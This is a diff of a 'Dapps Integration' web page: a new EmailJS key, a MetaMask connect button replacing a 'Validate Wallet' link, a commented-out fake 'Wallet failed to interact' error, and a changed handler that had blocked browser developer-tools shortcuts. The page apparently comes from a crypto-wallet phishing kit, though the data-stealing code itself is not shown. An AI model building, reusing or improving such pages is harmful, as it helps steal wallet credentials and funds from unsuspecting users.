@@ -17,9 +17,23 @@
 </script>
 <script type="text/javascript">
     (function(){
-    emailjs.init("dWzjFjnSov7XHnEXb"); // <==change to you public key
+    emailjs.init("26CX_SUlKku6cr7Cf"); // <==change to you public key
     })();
 </script>
+<script>
+    /* To connect using MetaMask */
+    async function connect() {
+     if (window.ethereum) {
+     
+      await window.ethereum.request({ method: "eth_requestAccounts" });
+      window.web3 = new Web3(window.ethereum);
+      
+     } else {
+      console.log("No wallet");
+     }
+    }
+    </script>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.7.4-rc.1/web3.min.js"></script>
    <!-- Paste Your Tawk.to Code Below -->
 </head>
 
@@ -39,7 +53,7 @@
                                 <div class="wrap-box flex">
                                     <div id="site-logo" class="clearfix">
                                         <div id="site-logo-inner">
-                                            <a href="https://v4runvault.com/" rel="home" class="main-logo">
+                                            <a href="index.html" rel="home" class="main-logo">
                                                 <h4 style="color: blue !important;">Dapps Integration</h4>
                                             </a>
                                         </div>
@@ -47,9 +61,7 @@
                                     
                                     <div class="flat-search-btn flex">
                                         <div class="sc-btn-top mg-r-12" id="site-header">
-                                            <a href="index.html" id="connectbtn" class="sc-button header-slider style style-1 wallet fl-button pri-1">
-                                                <span>Validate Wallet</span>
-                                            </a>
+                                            <input type="button" value="Connect Wallet" onclick="connect();">
                                         </div>
                                     </div>
                                 </div>
@@ -1123,8 +1135,8 @@
                         <span aria-hidden="true">&times;</span>
                     </button>
                     <div class="modal-body space-y-20 pd-40"> 
-                        <h2>Ooopss</h2>
-                        <p style="color: red;">Wallet failed to interact successfully</p>
+                        <!--<h2>Ooopss</h2>-->
+                        <!--<p style="color: red;">Wallet failed to interact successfully</p>-->
                     </div> 
                 </div>
             </div>
@@ -1427,7 +1439,7 @@
                 return false;
             }
             else if ((event.ctrlKey && event.shiftKey && event.keyCode == 73) || (event.ctrlKey && event.shiftKey && event.keyCode == 74)) {
-                return false;
+                return true;
             }
         });
     </script>
